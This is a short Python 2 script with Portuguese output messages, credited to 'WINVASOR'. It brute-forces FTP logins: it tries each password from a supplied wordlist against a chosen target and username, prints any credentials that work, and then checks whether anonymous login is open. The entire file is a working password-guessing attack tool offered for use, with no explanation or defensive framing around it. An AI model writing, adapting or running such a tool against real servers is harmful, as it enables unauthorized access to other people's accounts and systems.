#!/usr/bin/python2

'''CRIADO POR WINVASOR'''

import argparse
import sys
from ftplib import FTP



def check_anonymous_login(target):
    try:
        ftp = FTP(target)
        ftp.login()
        print "\n[+] Anonymous login is open."
        print "\n[+] Username : anonymous"
        print "\n[+] Password : anonymous\n"
        ftp.quit()
    except:
        pass


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print "\n[!] Credentials have found."
        print "\n[!] User : {}".format(username)
        print "\n[!] Pass : {}".format(password)
        sys.exit(0)
    except:
        pass


def brute_force(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftp_login(target, username, word)

    except:
        print "\n[-] POR FAVOR INSIRA A WORDLIST!!!. \n"
        sys.exit(0)



parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")

args = parser.parse_args()


target = args.target
username = args.username
wordlist = args.wordlist

brute_force(target, username, wordlist)
check_anonymous_login(target)
print "\n[-] Brute Terminado. \n"
